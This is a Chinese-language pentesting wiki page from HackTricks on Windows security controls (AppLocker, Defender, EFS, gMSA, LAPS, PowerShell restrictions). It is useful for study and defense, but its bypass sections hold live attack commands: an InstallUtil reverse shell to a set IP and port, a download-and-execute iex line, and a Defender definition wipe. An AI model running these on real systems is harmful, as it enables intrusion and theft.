# Windows 安全控制

{{#include ../banners/hacktricks-training.md}}

## AppLocker 策略

应用程序白名单是已批准的软件应用程序或可执行文件列表，这些应用程序或文件允许存在于系统中并运行。其目标是保护环境，避免受到有害恶意软件以及不符合组织特定业务需求的未批准软件的影响。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) 是 Microsoft 的**应用程序白名单解决方案**，可让系统管理员控制**用户可以运行哪些应用程序和文件**。它可对可执行文件、脚本、Windows 安装程序文件、DLL、打包应用程序和打包应用程序安装程序进行**精细控制**。\
组织通常会**阻止 cmd.exe 和 PowerShell.exe**，并限制对某些目录的写入权限，**但这些措施都可以绕过**。

### 检查

检查哪些文件/扩展名被列入黑名单/白名单：

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` 会根据 AppLocker 策略评估特定身份对应的候选文件。请测试将使用其令牌执行 payload 的账户，因为规则可能针对用户或组；`Get-AppLockerFileInformation` 也可用于检查规则可能匹配的路径、哈希和发布者元数据。<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

在将测试结果被拒绝视为强制阻止之前，请检查该规则集合的**有效强制模式**以及 Application Identity 服务。`AuditOnly` 会评估规则，但仍允许执行；而当该集合包含规则时，`NotConfigured` 并不等同于已禁用。<sup>[[7]](#references)</sup> `AppIDSvc` 停止运行会导致 AppLocker 无法强制执行规则。<sup>[[9]](#references)</sup> 这些检查有助于区分真正的绕过与从未阻止该文件的策略。

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

对于受控执行测试，请对比 AppLocker 事件日志：**8003/8006** 表示在 audit mode 下 EXE/DLL 或 script/MSI 本应被阻止；**8004/8007** 表示其确实被阻止。测试时应使用与预期执行路径相同的文件类型和身份。<sup>[[8]](#references)</sup>

此注册表路径包含 AppLocker 应用的配置和策略，可用于查看系统当前强制执行的规则集：

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- 可用于绕过 AppLocker Policy 的**可写文件夹**：如果 AppLocker 允许执行 `C:\Windows\System32` 或 `C:\Windows` 中的任何内容，就可以利用其中的**可写文件夹**来**绕过此限制**。

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- 通常被 **信任** 的 [**"LOLBAS's"**](https://lolbas-project.github.io/) 二进制文件也可用于绕过 AppLocker。
- **编写不当的规则也可能被绕过**
  - 例如，**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，你可以在任何位置创建一个名为 **`allowed` 的文件夹**，这样它就会被允许。
  - 组织也经常专注于 **阻止 `%System32%\WindowsPowerShell\v1.0\powershell.exe` 可执行文件**，却忘记了**其他** [**PowerShell 可执行文件位置**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)，例如 `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 或 `PowerShell_ISE.exe`。
- **DLL enforcement 很少启用**，因为它会给系统带来额外负载，而且需要进行大量测试以确保不会导致任何问题。因此，使用 **DLL 作为 backdoors 有助于绕过 AppLocker**。
- 你可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)，在任何进程中 **执行 Powershell** 代码并绕过 AppLocker。更多信息请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)。<sup>[[1]](#references)</sup>

## 凭据存储

### 安全帐户管理器 (SAM)

本地凭据存储在此文件中，密码经过哈希处理。

### 本地安全机构 (LSA) - LSASS

由于单点登录的需要，该子系统的**内存**中会**保存**（经过哈希处理的）**凭据**。\
**LSA** 管理本地**安全策略**（密码策略、用户权限……）、**身份验证**、**访问令牌**等。\
LSA 会**检查** **SAM** 文件中的凭据（用于本地登录），并与**域控制器**通信以验证域用户身份。

**凭据**保存在 **LSASS 进程**中：Kerberos 票证、NT 和 LM 哈希，以及可轻易解密的密码。

### LSA secrets

LSA 可能会将某些凭据保存到磁盘：

- Active Directory 计算机帐户的密码（域控制器不可达）。
- Windows 服务帐户的密码
- 计划任务的密码
- 其他（IIS 应用程序的密码……）

### NTDS.dit

它是 Active Directory 的数据库，仅存在于域控制器上。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) 是一款适用于 Windows 10、Windows 11 以及部分 Windows Server 版本的 Antivirus。它会**阻止**常见的 pentesting 工具，例如 **`WinPEAS`**。不过，有一些方法可以**绕过这些保护**。

### 检查

要检查 **Defender** 的**状态**，可以执行 PS cmdlet **`Get-MpComputerStatus`**（检查 **`RealTimeProtectionEnabled`** 的值，以确认它是否处于活动状态）：

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

你也可以运行以下命令来枚举相关信息：

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## 加密文件系统 (EFS)

EFS 通过加密来保护文件，使用一种称为**文件加密密钥 (FEK)** 的**对称密钥**。该密钥使用用户的**公钥**加密，并存储在文件的 NTFS `$EFS` 元数据（`$LOGGED_UTILITY_STREAM`）中，**而不是**普通的 `$DATA` 备用数据流中。<sup>[[10]](#references)</sup> 需要解密时，用户数字证书对应的**私钥**会解开 FEK。已配置的数据恢复代理 (DRA) 会在数据恢复字段中保存 FEK 的另一个加密副本。<sup>[[13]](#references)</sup>

**无需用户主动操作即可解密的情形**包括：

- 将文件或文件夹移动到非 EFS 文件系统（如 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)）时，它们会自动解密。
- 通过 SMB/CIFS 协议在网络上发送加密文件时，文件会在传输前解密。

这种加密方式让所有者能够**透明地访问**加密文件。但是，仅更改所有者的密码并登录，并不能解密文件。

**要点**：

- EFS 使用对称 FEK，并用用户的公钥加密。
- 解密时使用用户的私钥来访问 FEK。
- 在特定情况下会自动解密，例如复制到 FAT32 或通过网络传输。
- 所有者无需额外操作即可访问加密文件。

### 检查 EFS 信息

不要根据 `%APPDATA%\Microsoft\Protect` 推断是否使用了 EFS：该目录存储着供许多 Windows 功能使用的 DPAPI 主密钥。<sup>[[19]](#references)</sup> 应改为使用 `cipher /c "C:\path\file"` 检查加密文件，列出其用户证书和恢复证书。对于拥有匹配私钥的主体，`cipher /e` 和 `cipher /d` 可分别加密和解密文件。<sup>[[11]](#references)</sup>

### 解密 EFS 文件

如果 `cipher /c` 列出了恢复证书，并且你拥有其**匹配的 DRA 私钥**（存储在 PFX 中），请将该 PFX 导入当前用户的证书存储区，然后解密文件。<sup>[[11]](#references)[[12]](#references)</sup> 新生成的 DRA 证书无法解密较早的文件：加密文件时必须已包含该证书的公钥。仅有 NTFS ACL 访问权限或重置账户密码，都无法提供所需的私钥。<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### 以 Authority System 身份运行

此方法要求**受害者用户**在主机上**运行**一个**进程**。如果满足此条件，你可以通过 `meterpreter` 会话模拟该用户的进程令牌（使用 `incognito` 中的 `impersonate_token`）。或者，你可以 `migrate` 到该用户的进程中。

#### 知道用户的密码

Mimikatz 可以导入用户的证书和私钥，然后使用它们解密受 EFS 保护的文件。<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft 开发了 **Group Managed Service Accounts (gMSA)**，以简化 IT 基础设施中服务账户的管理。与通常启用了“**Password never expire**”设置的传统服务账户不同，gMSA 提供了一种更安全且易于管理的解决方案：

- **自动密码管理**：gMSA 使用复杂的 240 字节密码，通常每 30 天轮换一次。域控制器使用 KDS 密钥材料派生该密码，无需手动更新密码。<sup>[[16]](#references)[[20]](#references)</sup>
- **增强的安全性**：这些账户不会被锁定，也不能用于交互式登录，从而增强了安全性。
- **支持多个主机**：gMSA 可以在多台主机之间共享，非常适合在多台服务器上运行的服务。
- **计划任务支持**：与托管服务账户不同，gMSA 支持运行计划任务。
- **简化 SPN 管理**：当计算机的 sAMaccount 详细信息或 DNS 名称发生变化时，系统会自动更新 Service Principal Name (SPN)，从而简化 SPN 管理。

域控制器在读取时根据 KDS 派生的密码材料构造 LDAP 属性 _**msDS-ManagedPassword**_；该值不是独立存储的密码。它通常每 30 天更改一次。<sup>[[20]](#references)</sup> 返回的 [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) **不是加密后的密码**：其 `CurrentPassword` 字段包含明文密码。<sup>[[14]](#references)</sup> 访问权限会根据 `msDS-GroupMSAMembership` 检查，因此任何获准检索该密码的主体都属于范围内，并不只有管理员或服务主机。<sup>[[15]](#references)</sup> LDAP 连接必须提供机密性保护，例如使用 LDAPS 或 SASL sealing。<sup>[[20]](#references)</sup>

有关 KDS 根密钥泄露后的离线密码派生，请参阅 [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md)。

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

你可以使用 [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)** 读取此密码：**

```
/GMSAPasswordReader --AccountName jkohler
```

[**在这篇文章中了解更多信息**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

另外，请查看这个[网页](https://cube0x0.github.io/Relaying-for-gMSA/)，了解如何执行 **NTLM relay attack** 来**读取** gMSA 的**密码**。<sup>[[3]](#references)</sup>

## LAPS

在枚举过程中，区分 **legacy Microsoft LAPS** 和原生的 **Windows LAPS** 实现。Windows LAPS 随 2023 年 4 月 11 日的 Windows 更新发布，可将受管理的本地管理员密码备份到 **Windows Server Active Directory** 或 **Microsoft Entra ID**。在由 AD 支持的部署中，它还可以加密密码、保留加密后的密码历史记录，以及管理域控制器的 DSRM 密码。可下载的 legacy MSI 已在较新的 Windows 版本中弃用，但 Windows LAPS 仍可在 legacy-emulation mode 下运行。<sup>[[6]](#references)</sup>

由于 legacy Microsoft LAPS 和 Windows LAPS 是相互独立的实现，因此在使用特定属性或 cmdlet 的攻击之前，先确认部署的是哪一种。链接页面介绍了发现、ACL 枚举、密码获取、过期时间操纵和离线恢复，本文不再重复这些步骤。<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) 会**限制许多有效使用 PowerShell 所需的功能**，例如阻止使用 COM 对象、仅允许使用经批准的 .NET 类型、基于 XAML 的工作流、PowerShell 类等。

### **检查**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2` 仅在安装了可选 PowerShell 2 引擎的主机上，才是一种旧式降级方式。更新后的 Windows 11 24H2 或 Windows Server 2025 不再包含该引擎；不要将其视为当前可用的 CLM bypass。<sup>[[17]](#references)</sup> 在应用程序控制下，PowerShell 会在 Constrained Language 中运行不受信任的代码，而受策略信任的脚本可以在 Full Language 中运行。<sup>[[18]](#references)</sup>

对于较旧的配置，可以使用 [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。\
**要编译它，你可能需要** **添加引用** -> _浏览_ ->_浏览_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`，并将项目**改为 .Net4.5**。

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

你可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)，在任意进程中**执行 Powershell** 代码并绕过受限模式。更多信息请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)。<sup>[[1]](#references)</sup>

## PS 执行策略

默认设置为**受限**。绕过此策略的主要方法：<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

更多内容请参见 [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## 安全支持提供程序接口 (SSPI)

这是一个可用于对用户进行身份验证的 API。

SSPI 负责为希望通信的两台计算机找到合适的协议。首选方法是 Kerberos。随后，SSPI 会协商要使用的身份验证协议。这些身份验证协议称为安全支持提供程序 (SSP)，以 DLL 的形式位于每台 Windows 计算机中；两台计算机必须支持相同的 SSP 才能进行通信。

### 主要 SSP

- **Kerberos**：首选协议
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** 和 **NTLMv2**：出于兼容性原因使用
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**：用于 Web 服务器和 LDAP，密码以 MD5 hash 的形式保存
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**：用于 SSL 和 TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**：用于协商所用协议（Kerberos 或 NTLM，默认使用 Kerberos）
  - %windir%\Windows\System32\lsasrv.dll

#### 协商可提供多种方法，也可以只提供一种。

## UAC - 用户帐户控制

[用户帐户控制 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一项可为**需要提升权限的操作显示同意提示**的功能。

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [绕过 AppLocker 和 PowerShell 受限语言模式](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [如何解密 EFS 文件](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [针对 gMSA 的中继攻击](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [绕过 PowerShell 执行策略的 15 种方法](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [使用 AppLocker Windows PowerShell cmdlet](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Windows LAPS 概述](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [使用 AppLocker 规则](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [在 AppLocker 中使用事件查看器](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [AppLocker 进程和交互](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [文件流（本地文件系统）](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Cipher 命令](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Certutil 命令](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [备份恢复代理 EFS 私钥](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [ms-DS-GroupMSAMembership 属性](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [保护组托管服务帐户](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [从 Windows 客户端中移除的功能](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [使用 App Control 保护 PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [事件 4693 和 DPAPI 主密钥](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [msDS-ManagedPassword 的构造](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
